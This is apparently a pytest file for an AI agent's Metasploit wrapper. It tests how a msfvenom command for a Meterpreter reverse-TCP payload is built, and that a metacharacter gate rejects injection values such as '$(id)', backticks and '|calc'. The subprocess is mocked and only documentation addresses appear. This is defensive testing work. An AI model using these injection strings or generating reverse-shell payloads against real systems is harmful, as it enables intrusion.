"""KA-005 - generate_payload argument battery: msfvenom argv building
pinned exactly, the metachar gate raised BEFORE any process attempt
(the run stub stays empty), the file-vs-stdout branches (-o + None return
vs captured stdout bytes), and the failure branches (both None with
logging). The method does a function-local `import subprocess`, so the
mock binds the stdlib module attribute via monkeypatch (reverted per
test). No network; no real binary runs."""
from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from agentic_ai.agents.cyber.kali import MetasploitRPC, _validate_command_args

PAYLOAD = "windows/x64/meterpreter/reverse_tcp"
BENIGN_LHOST = "192.0.2.1"  # RFC 5737


def _rpc():
    return MetasploitRPC(host="127.0.0.1", port=55553, token=None)


@pytest.fixture()
def run_recorder(monkeypatch):
    calls = []

    class _Completed:
        returncode = 0
        stdout = b"payload-bytes"

    def fake_run(cmd_args, capture_output=False, check=False, **kwargs):
        calls.append({
            "args": list(cmd_args),
            "capture_output": capture_output,
            "check": check,
        })
        return _Completed()

    monkeypatch.setattr("subprocess.run", fake_run)
    return calls


def test_argv_shape_exact_stdout_branch(run_recorder):
    out = _rpc().generate_payload(PAYLOAD, BENIGN_LHOST, 4444)
    assert out == b"payload-bytes"
    assert run_recorder == [{
        "args": ["msfvenom", "-p", PAYLOAD,
                 "LHOST=192.0.2.1", "LPORT=4444", "-f", "raw"],
        "capture_output": True, "check": True}]


def test_file_branch_adds_o_and_returns_none(run_recorder, tmp_path):
    target = tmp_path / "out.bin"
    out = _rpc().generate_payload(PAYLOAD, BENIGN_LHOST, 4444,
                                  format="exe", output_file=str(target))
    assert out is None  # the file branch ALWAYS returns None (even ok)
    assert run_recorder == [{
        "args": ["msfvenom", "-p", PAYLOAD, "LHOST=192.0.2.1",
                 "LPORT=4444", "-f", "exe", "-o", str(target)],
        "capture_output": False, "check": True}]


@pytest.mark.parametrize("field,value", [
    ("payload", "win; x64"),
    ("payload", "win|calc"),
    ("lhost", "192.0.2.1$(id)"),
    ("lhost", "a&b"),
    ("format", "exe`id`"),
])
def test_metachar_rejection_before_any_process(run_recorder, field, value):
    kwargs = {"payload": PAYLOAD, "lhost": BENIGN_LHOST,
              "lport": 4444, "format": "raw"}
    kwargs[field] = value
    with pytest.raises(ValueError):
        _rpc().generate_payload(**kwargs)
    assert run_recorder == []  # the gate fired BEFORE any process


def test_metachar_gate_message_carries_the_arg():
    with pytest.raises(ValueError) as exc:
        _validate_command_args(["msfvenom", "-p", "win; x64", "-f", "raw"])
    assert "Rejected dangerous metacharacter" in str(exc.value)


@pytest.mark.parametrize("mode", ["file", "stdout"])
def test_failure_branches_return_none(run_recorder, monkeypatch, tmp_path,
                                      mode):
    def failing_run(*args, **kwargs):
        raise subprocess.CalledProcessError(2, "msfvenom")

    monkeypatch.setattr("subprocess.run", failing_run)
    if mode == "file":
        out = _rpc().generate_payload(PAYLOAD, BENIGN_LHOST, 4444,
                                      format="exe",
                                      output_file=str(tmp_path / "out.bin"))
    else:
        out = _rpc().generate_payload(PAYLOAD, BENIGN_LHOST, 4444)
    assert out is None
